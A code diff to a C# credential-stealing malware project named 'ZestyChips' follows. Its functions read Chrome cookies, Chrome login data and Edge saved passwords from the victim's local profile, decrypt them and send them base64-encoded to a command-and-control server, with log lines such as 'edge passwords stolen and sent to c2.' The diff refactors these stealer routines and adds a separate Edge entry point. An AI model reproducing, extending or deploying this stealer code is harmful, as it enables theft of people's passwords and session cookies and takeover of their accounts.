@@ -19,21 +19,30 @@ namespace ZestyChips
         {
             // steal chrome data
             Chrome();
+
+            // steal edge data
+            Edge();
         }
 
         /*
         * stealer functions for Chrome
         */
         private static void Chrome() {
-            string cookies = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
-            string login = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
-            string edge = StealEdgeData();
+            StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
+            StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
+        }
+
+        /*
+        * stealer functions for Edge
+        */
+        private static void Edge() {
+            StealEdgePasswords();
         }
         
         /*
         * Steals edge data
         */
-        private static string StealEdgeData() {
+        private static void StealEdgePasswords() {
             string result = string.Empty;
             string loginDataLoc = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
             string edgeFinalData = string.Empty;
@@ -42,12 +51,12 @@ namespace ZestyChips
             Dictionary<string, string> masterDictionary = new Dictionary<string, string>();
             List<string> passwordResultsList = new List<string>();
 
-            // Helpers.PrintInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc);
-
             // check if we have edge data in the first place
             bool hasEdgeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc);
             if (hasEdgeData) {
-                return "Edge not found";
+                Program.SendBase64EncodedData("Edge not found");
+                Helpers.PrintFail("edge not found");
+                return;
             }
 
             string sourceFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + loginDataLoc;
@@ -105,32 +114,31 @@ namespace ZestyChips
                         edgeFinalData = JsonSerializer.Serialize(passwordResultsList);
                         Program.SendBase64EncodedData(edgeFinalData); // send data off to c2
                         Helpers.PrintSuccess("legacy edge passwords stolen and sent to c2.");
-                        return edgeFinalData;
+                        return;
                     }
 
                     edgeFinalData = JsonSerializer.Serialize(masterDictionary);
                     Program.SendBase64EncodedData(edgeFinalData); // send data off to c2
                     Helpers.PrintSuccess("edge passwords stolen and sent to c2.");
-                    return edgeFinalData;
+                    return;
 
             } catch (Exception ex) {
                 Helpers.PrintFail($"Error processing Edge data: {ex}");
             }
-            
-            // if we reached here, something went wrong
-            return result;
-        }
+                    }
 
         /*
         * Generic entry to steal data from vaults, given an input path and save file name
         * Returns a string, json serialised data
         */
-        private static string StealChromeData(string path, string fileSaveName) {
+        private static void StealChromeData(string path, string fileSaveName) {
             bool hasChromeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
             string result = string.Empty;
 
             if (hasChromeData) {
-                return "Chrome not found";
+                Program.SendBase64EncodedData("Chrome not found");
+                Helpers.PrintFail("chrome not found");
+                return;
             }
 
             try {
@@ -151,7 +159,7 @@ namespace ZestyChips
                 switch (fileSaveName) {
                     case "cc":
                         result = DecryptChromeCookies(fileSaveName);
-                        Program.SendBase64EncodedData(result); // send data off to c2
+                        Program.SendBase64EncodedData(result);
                         Helpers.PrintSuccess("chrome cookies stolen and sent to c2.");
                         break;
                     
@@ -176,13 +184,8 @@ namespace ZestyChips
                     if (File.Exists(fileSaveName)) {
                         File.Delete(fileSaveName);
                     }
-                } catch {
-                    // Helpers.PrintFail($"Failed to delete file: {fileSaveName}, error: {ex.Message}");
-                }
-                
+                } catch { }
             }
-
-            return result;
         }
         
         /*
@@ -383,10 +386,6 @@ namespace ZestyChips
                 }
 
             }
-
-            // cleanup
-            // sqliteConnection.Close();
-            // sdr.Close();
 
             // serialise to JSON and ret
             return JsonSerializer.Serialize(masterDictionary);
